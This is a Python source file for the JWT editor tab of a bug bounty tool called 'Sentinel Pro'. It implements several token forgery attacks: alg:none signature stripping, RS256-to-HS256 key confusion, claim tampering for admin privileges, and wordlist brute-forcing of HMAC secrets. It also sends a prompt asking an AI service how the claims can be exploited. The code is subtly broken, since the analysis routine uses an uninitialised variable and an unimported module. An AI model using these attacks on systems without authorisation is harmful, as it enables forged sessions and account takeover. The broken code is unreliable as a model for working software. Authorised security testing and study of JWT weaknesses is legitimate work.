# ============================================================================
# Sentinel Pro v3.1 — Professional OSINT & Bug Bounty Platform
# Copyright (c) 2026 @who_is_the_black_hat. All rights reserved.
# ============================================================================

"""
JWT Editor Tab
==============
JWT decode, edit, resign — bug bounty attacks:
  - alg:none attack
  - Key confusion (RS256 → HS256)
  - Claim edit (exp, sub, role, admin)
  - Custom secret resign
  - Weak secret brute-force
"""

import tkinter as tk
from tkinter import ttk, messagebox
import json
import base64
import hmac
import hashlib
import threading
import logging

logger = logging.getLogger(__name__)


def _b64url_decode(s: str) -> bytes:
    s += '=' * (4 - len(s) % 4)
    return base64.urlsafe_b64decode(s)

def _b64url_encode(b: bytes) -> str:
    return base64.urlsafe_b64encode(b).rstrip(b'=').decode()


class JWTEditorTab:

    def __init__(self, notebook, app):
        self.app = app
        self.db  = app.db
        self.frame = ttk.Frame(notebook)
        notebook.add(self.frame, text='⊕ JWT Editor')
        self._build()

    def _build(self):
        from sentinel_proxy.ui.app import (
            BG, BG2, BG3, BG4, ACCENT, TEXT, TEXT2, TEXT3,
            GREEN, RED, ORANGE, YELLOW, CYAN, FONT_MONO, FONT_MONO_XS
        )
        self._C = dict(BG=BG, BG2=BG2, BG3=BG3, BG4=BG4, ACCENT=ACCENT,
                       TEXT=TEXT, TEXT2=TEXT2, TEXT3=TEXT3, GREEN=GREEN,
                       RED=RED, ORANGE=ORANGE, YELLOW=YELLOW, CYAN=CYAN)

        # ── Toolbar ───────────────────────────────────────────────────────────
        tb = tk.Frame(self.frame, bg=BG3)
        tb.pack(fill='x')

        ttk.Button(tb, text='▶  DECODE', style='Cyan.TButton',
            command=self._decode).pack(side='left', padx=8, pady=6)
        ttk.Button(tb, text='✎  RESIGN', style='Green.TButton',
            command=self._resign).pack(side='left', padx=4, pady=6)
        ttk.Button(tb, text='ALG:NONE', style='Red.TButton',
            command=self._alg_none).pack(side='left', padx=4, pady=6)
        ttk.Button(tb, text='KEY CONFUSION', style='Ghost.TButton',
            command=self._key_confusion).pack(side='left', padx=4, pady=6)
        ttk.Button(tb, text='BRUTE SECRET', style='Ghost.TButton',
            command=self._brute_secret).pack(side='left', padx=4, pady=6)
        ttk.Button(tb, text='✦ AI ANALYZE', style='Ghost.TButton',
            command=self._ai_analyze).pack(side='left', padx=4, pady=6)
        ttk.Button(tb, text='FROM PROXY', style='Ghost.TButton',
            command=self._from_proxy).pack(side='left', padx=4, pady=6)
        ttk.Button(tb, text='CLEAR', style='Ghost.TButton',
            command=self._clear).pack(side='left', padx=4, pady=6)

        self._status_lbl = tk.Label(tb, text='', bg=BG3, fg=TEXT2, font=FONT_MONO_XS)
        self._status_lbl.pack(side='right', padx=12)

        # ── Secret row ────────────────────────────────────────────────────────
        sr = tk.Frame(self.frame, bg=BG3)
        sr.pack(fill='x', padx=10, pady=4)

        def lbl(t):
            tk.Label(sr, text=t, bg=BG3, fg=TEXT2,
                font=('Fira Code', 8, 'bold')).pack(side='left', padx=(0, 5))

        lbl('SECRET')
        self._secret_entry = ttk.Entry(sr, width=30, font=FONT_MONO)
        self._secret_entry.pack(side='left', padx=(0, 12))

        lbl('ALGORITHM')
        self._alg_var = ttk.Combobox(sr, width=10, state='readonly',
            values=['HS256', 'HS384', 'HS512', 'none'])
        self._alg_var.set('HS256')
        self._alg_var.pack(side='left', padx=(0, 12))

        # ── Main split ────────────────────────────────────────────────────────
        pw = ttk.PanedWindow(self.frame, orient='horizontal')
        pw.pack(fill='both', expand=True)

        # Left: input + output JWT
        lf = tk.Frame(pw, bg=BG)
        pw.add(lf, weight=1)

        # Input JWT
        lh1 = tk.Frame(lf, bg=BG3)
        lh1.pack(fill='x')
        tk.Frame(lh1, bg=CYAN, width=3).pack(side='left', fill='y')
        tk.Label(lh1, text='  INPUT JWT', bg=BG3, fg=CYAN,
            font=('Fira Code', 8, 'bold')).pack(side='left', padx=4, pady=5)

        self._input_txt = tk.Text(lf, bg=BG2, fg=YELLOW,
            font=('Fira Code', 9), relief='flat', borderwidth=0,
            wrap='word', padx=10, pady=8, height=4,
            insertbackground=ACCENT)
        self._input_txt.pack(fill='x')

        # Output JWT
        lh2 = tk.Frame(lf, bg=BG3)
        lh2.pack(fill='x')
        tk.Frame(lh2, bg=GREEN, width=3).pack(side='left', fill='y')
        tk.Label(lh2, text='  OUTPUT JWT  (modified)', bg=BG3, fg=GREEN,
            font=('Fira Code', 8, 'bold')).pack(side='left', padx=4, pady=5)
        ttk.Button(lh2, text='COPY', style='Ghost.TButton',
            command=self._copy_output).pack(side='right', padx=8)

        self._output_txt = tk.Text(lf, bg=BG2, fg=GREEN,
            font=('Fira Code', 9), relief='flat', borderwidth=0,
            wrap='word', padx=10, pady=8, height=4,
            insertbackground=ACCENT)
        self._output_txt.pack(fill='x')

        # Middle: header + payload editors
        mf = tk.Frame(pw, bg=BG)
        pw.add(mf, weight=2)

        # Header
        mh1 = tk.Frame(mf, bg=BG3)
        mh1.pack(fill='x')
        tk.Frame(mh1, bg=ORANGE, width=3).pack(side='left', fill='y')
        tk.Label(mh1, text='  HEADER', bg=BG3, fg=ORANGE,
            font=('Fira Code', 8, 'bold')).pack(side='left', padx=4, pady=5)

        self._header_txt = tk.Text(mf, bg=BG2, fg=ORANGE,
            font=('Fira Code', 9), relief='flat', borderwidth=0,
            wrap='none', padx=10, pady=8, height=6,
            insertbackground=ACCENT)
        self._header_txt.pack(fill='x')

        # Payload
        mh2 = tk.Frame(mf, bg=BG3)
        mh2.pack(fill='x')
        tk.Frame(mh2, bg=CYAN, width=3).pack(side='left', fill='y')
        tk.Label(mh2, text='  PAYLOAD  (edit claims here)', bg=BG3, fg=CYAN,
            font=('Fira Code', 8, 'bold')).pack(side='left', padx=4, pady=5)

        payload_f = tk.Frame(mf, bg=BG)
        payload_f.pack(fill='both', expand=True)
        self._payload_txt = tk.Text(payload_f, bg=BG2, fg=CYAN,
            font=('Fira Code', 9), relief='flat', borderwidth=0,
            wrap='none', padx=10, pady=8,
            insertbackground=ACCENT)
        vs = ttk.Scrollbar(payload_f, orient='vertical', command=self._payload_txt.yview)
        self._payload_txt.configure(yscrollcommand=vs.set)
        vs.pack(side='right', fill='y')
        self._payload_txt.pack(fill='both', expand=True)

        # Right: analysis
        rf = tk.Frame(pw, bg=BG)
        pw.add(rf, weight=1)

        rh = tk.Frame(rf, bg=BG3)
        rh.pack(fill='x')
        tk.Frame(rh, bg=RED, width=3).pack(side='left', fill='y')
        tk.Label(rh, text='  ANALYSIS', bg=BG3, fg=RED,
            font=('Fira Code', 8, 'bold')).pack(side='left', padx=4, pady=5)

        analysis_f = tk.Frame(rf, bg=BG)
        analysis_f.pack(fill='both', expand=True)
        self._analysis_txt = tk.Text(analysis_f, bg=BG2, fg=TEXT,
            font=('Fira Code', 9), relief='flat', borderwidth=0,
            wrap='word', padx=10, pady=8, state='disabled')
        vs2 = ttk.Scrollbar(analysis_f, orient='vertical', command=self._analysis_txt.yview)
        self._analysis_txt.configure(yscrollcommand=vs2.set)
        vs2.pack(side='right', fill='y')
        self._analysis_txt.pack(fill='both', expand=True)

    # ── Core ──────────────────────────────────────────────────────────────────

    def _parse_jwt(self, token: str):
        token = token.strip()
        parts = token.split('.')
        if len(parts) < 2:
            raise ValueError('Invalid JWT — need at least 2 parts')
        header  = json.loads(_b64url_decode(parts[0]))
        payload = json.loads(_b64url_decode(parts[1]))
        sig     = parts[2] if len(parts) > 2 else ''
        return header, payload, sig, parts

    def _decode(self):
        token = self._input_txt.get('1.0', 'end').strip()
        if not token:
            messagebox.showwarning('JWT Editor', 'Paste a JWT token first')
            return
        try:
            header, payload, sig, parts = self._parse_jwt(token)
            self._header_txt.delete('1.0', 'end')
            self._header_txt.insert('1.0', json.dumps(header, indent=2))
            self._payload_txt.delete('1.0', 'end')
            self._payload_txt.insert('1.0', json.dumps(payload, indent=2))
            self._show_analysis(header, payload, sig)
            self._status_lbl.config(text='Decoded', fg=self._C['GREEN'])
        except Exception as e:
            messagebox.showerror('JWT Editor', f'Decode error: {e}')

    def _resign(self):
        try:
            header  = json.loads(self._header_txt.get('1.0', 'end').strip())
            payload = json.loads(self._payload_txt.get('1.0', 'end').strip())
        except json.JSONDecodeError as e:
            messagebox.showerror('JWT Editor', f'Invalid JSON: {e}')
            return

        alg    = self._alg_var.get()
        secret = self._secret_entry.get().strip()
        header['alg'] = alg

        h_enc = _b64url_encode(json.dumps(header, separators=(',', ':')).encode())
        p_enc = _b64url_encode(json.dumps(payload, separators=(',', ':')).encode())
        signing_input = f'{h_enc}.{p_enc}'.encode()

        if alg == 'none':
            new_token = f'{h_enc}.{p_enc}.'
        elif alg in ('HS256', 'HS384', 'HS512'):
            hash_map = {'HS256': hashlib.sha256, 'HS384': hashlib.sha384, 'HS512': hashlib.sha512}
            sig = hmac.new(secret.encode(), signing_input, hash_map[alg]).digest()
            new_token = f'{h_enc}.{p_enc}.{_b64url_encode(sig)}'
        else:
            messagebox.showwarning('JWT Editor', f'Algorithm {alg} not supported for resign')
            return

        self._output_txt.delete('1.0', 'end')
        self._output_txt.insert('1.0', new_token)
        self._status_lbl.config(text=f'Resigned with {alg}', fg=self._C['GREEN'])

    def _alg_none(self):
        """alg:none attack — remove signature"""
        try:
            header  = json.loads(self._header_txt.get('1.0', 'end').strip())
            payload = json.loads(self._payload_txt.get('1.0', 'end').strip())
        except Exception as e:
            messagebox.showerror('JWT Editor', f'Invalid JSON: {e}')
            return

        header['alg'] = 'none'
        self._header_txt.delete('1.0', 'end')
        self._header_txt.insert('1.0', json.dumps(header, indent=2))
        self._alg_var.set('none')
        self._secret_entry.delete(0, 'end')
        self._resign()
        self._status_lbl.config(text='alg:none attack applied', fg=self._C['RED'])

        self._write_analysis(
            self._analysis_txt.get('1.0', 'end') +
            '\n── alg:none Attack ──\n'
            'Signature removed. If server accepts this token,\n'
            'it is vulnerable to algorithm confusion.\n'
            'Test: send output JWT to the target endpoint.\n'
        )

    def _key_confusion(self):
        """RS256 → HS256 key confusion attack"""
        try:
            header = json.loads(self._header_txt.get('1.0', 'end').strip())
        except Exception:
            messagebox.showerror('JWT Editor', 'Decode a JWT first')
            return

        orig_alg = header.get('alg', '')
        if 'RS' not in orig_alg and 'ES' not in orig_alg:
            messagebox.showwarning('JWT Editor',
                f'Current alg is {orig_alg} — key confusion targets RS256/ES256')
            return

        header['alg'] = 'HS256'
        self._header_txt.delete('1.0', 'end')
        self._header_txt.insert('1.0', json.dumps(header, indent=2))
        self._alg_var.set('HS256')

        self._write_analysis(
            self._analysis_txt.get('1.0', 'end') +
            f'\n── Key Confusion Attack ──\n'
            f'Changed {orig_alg} → HS256\n'
            f'Set SECRET to the server\'s PUBLIC KEY (PEM format)\n'
            f'then click RESIGN.\n'
            f'If server verifies HS256 with its own public key → vulnerable.\n'
        )
        self._status_lbl.config(text='Key confusion: set public key as secret, then RESIGN',
                                 fg=self._C['ORANGE'])

    def _brute_secret(self):
        token = self._input_txt.get('1.0', 'end').strip()
        if not token:
            messagebox.showwarning('JWT Editor', 'Paste a JWT first')
            return

        wordlist = [
            'secret', 'password', '123456', 'qwerty', 'admin', 'test',
            'jwt_secret', 'your-256-bit-secret', 'supersecret', 'changeme',
            'secret123', 'mysecret', 'key', 'private', 'token', 'jwt',
            'hs256', 'hmac', 'sign', 'app_secret', 'api_secret', 'flask',
            'django-insecure', 'laravel', 'rails', 'express', 'node',
        ]

        def _run():
            try:
                parts = token.split('.')
                if len(parts) < 3:
                    return
                signing_input = f'{parts[0]}.{parts[1]}'.encode()
                sig_bytes     = _b64url_decode(parts[2])

                for word in wordlist:
                    test_sig = hmac.new(word.encode(), signing_input, hashlib.sha256).digest()
                    if test_sig == sig_bytes:
                        self.app.root.after(0, lambda w=word: [
                            self._secret_entry.delete(0, 'end'),
                            self._secret_entry.insert(0, w),
                            self._status_lbl.config(
                                text=f'SECRET FOUND: {w}', fg=self._C['RED']),
                            messagebox.showwarning('JWT Editor',
                                f'Weak secret found: "{w}"\nThis JWT is VULNERABLE!')
                        ])
                        return

                self.app.root.after(0, lambda: self._status_lbl.config(
                    text='Secret not in wordlist', fg=self._C['ORANGE']))
            except Exception as e:
                self.app.root.after(0, lambda: self._status_lbl.config(
                    text=f'Error: {e}', fg=self._C['RED']))

        self._status_lbl.config(text='Brute-forcing...', fg=self._C['YELLOW'])
        threading.Thread(target=_run, daemon=True).start()

    def _ai_analyze(self):
        """Groq analysis of decoded JWT — attacks, risks, recommendations."""
        token = self._input_txt.get('1.0', 'end').strip()
        if not token:
            return
        analyzer = self.app.analyzer
        if not hasattr(analyzer, '_groq') or not analyzer._groq:
            self._write_analysis(self._analysis_txt.get('1.0', 'end') +
                '\n[Groq not available]\n')
            return
        try:
            header  = json.loads(self._header_txt.get('1.0', 'end').strip())
            payload = json.loads(self._payload_txt.get('1.0', 'end').strip())
        except Exception:
            return
        self._write_analysis(self._analysis_txt.get('1.0', 'end') +
            '\nRunning Groq analysis...\n')

        def _run():
            prompt = (
                f"JWT token analysis:\n"
                f"Header : {json.dumps(header)}\n"
                f"Payload: {json.dumps(payload)}\n\n"
                f"1. What attacks are possible (alg:none, key confusion, weak secret, claim tampering)?\n"
                f"2. Which claims are security-sensitive and how to exploit them?\n"
                f"3. Remediation. Be concise and technical."
            )
            try:
                result = analyzer._groq.ask(prompt, max_tokens=400)
                self.app.root.after(0, lambda r=result:
                    self._write_analysis(
                        self._analysis_txt.get('1.0', 'end') +
                        f'\n── Groq AI ──\n{r}\n'))
            except Exception as e:
                self.app.root.after(0, lambda:
                    self._write_analysis(
                        self._analysis_txt.get('1.0', 'end') +
                        f'\nGroq error: {e}\n'))

        threading.Thread(target=_run, daemon=True).start()

    def _show_analysis(self, header: dict, payload: dict, sig: str):
        out += f'Algorithm : {header.get("alg", "?")}\n'
        out += f'Type      : {header.get("typ", "?")}\n\n'

        alg = header.get('alg', '')
        if alg == 'none':
            out += '[CRITICAL] alg:none — no signature verification!\n\n'
        elif alg in ('RS256', 'RS384', 'RS512'):
            out += '[INFO] RSA algorithm — try key confusion attack\n\n'
        elif alg in ('HS256', 'HS384', 'HS512'):
            out += '[INFO] HMAC — try brute-force weak secret\n\n'

        # Claims
        out += '── Claims ──\n'
        now = time.time()
        for k, v in payload.items():
            if k == 'exp':
                left = int(v) - now
                if left < 0:
                    out += f'  exp : {v} ⚠ EXPIRED {abs(int(left))}s ago\n'
                else:
                    out += f'  exp : {v} (expires in {int(left)}s)\n'
            elif k == 'iat':
                out += f'  iat : {v} (issued at)\n'
            elif k in ('sub', 'user', 'username', 'email'):
                out += f'  {k:<4}: {v} ← try privilege escalation\n'
            elif k in ('role', 'admin', 'is_admin', 'scope', 'permissions'):
                out += f'  {k:<4}: {v} ← try changing to admin/true\n'
            else:
                out += f'  {k:<4}: {v}\n'

        out += '\n── Attacks to Try ──\n'
        out += '1. alg:none — click ALG:NONE button\n'
        out += '2. Weak secret — click BRUTE SECRET\n'
        out += '3. Edit claims (role/admin) → RESIGN\n'
        if alg.startswith('RS'):
            out += '4. Key confusion — click KEY CONFUSION\n'

        self._write_analysis(out)

    def _write_analysis(self, text: str):
        self._analysis_txt.config(state='normal')
        self._analysis_txt.delete('1.0', 'end')
        self._analysis_txt.insert('1.0', text)
        self._analysis_txt.config(state='disabled')

    def _from_proxy(self):
        req_id = getattr(self.app, 'selected_req', None)
        if not req_id:
            messagebox.showwarning('JWT Editor', 'Select a request in Proxy tab first')
            return
        req = self.db.get_request(req_id)
        if not req:
            return
        try:
            hdrs = json.loads(req.get('headers', '{}'))
            auth = hdrs.get('Authorization', hdrs.get('authorization', ''))
            if auth.startswith('Bearer '):
                token = auth[7:]
                self._input_txt.delete('1.0', 'end')
                self._input_txt.insert('1.0', token)
                self._decode()
                return
        except Exception:
            pass
        body = req.get('body', '')
        for part in body.split('&'):
            if 'token' in part.lower() or 'jwt' in part.lower():
                _, _, val = part.partition('=')
                if val.count('.') == 2:
                    self._input_txt.delete('1.0', 'end')
                    self._input_txt.insert('1.0', val)
                    self._decode()
                    return
        messagebox.showwarning('JWT Editor', 'No JWT found in selected request')

    def _copy_output(self):
        out = self._output_txt.get('1.0', 'end').strip()
        if out:
            self.app.root.clipboard_clear()
            self.app.root.clipboard_append(out)
            self._status_lbl.config(text='Copied!', fg=self._C['GREEN'])

    def _clear(self):
        for w in (self._input_txt, self._output_txt,
                  self._header_txt, self._payload_txt):
            w.delete('1.0', 'end')
        self._write_analysis('')
        self._secret_entry.delete(0, 'end')
        self._status_lbl.config(text='')
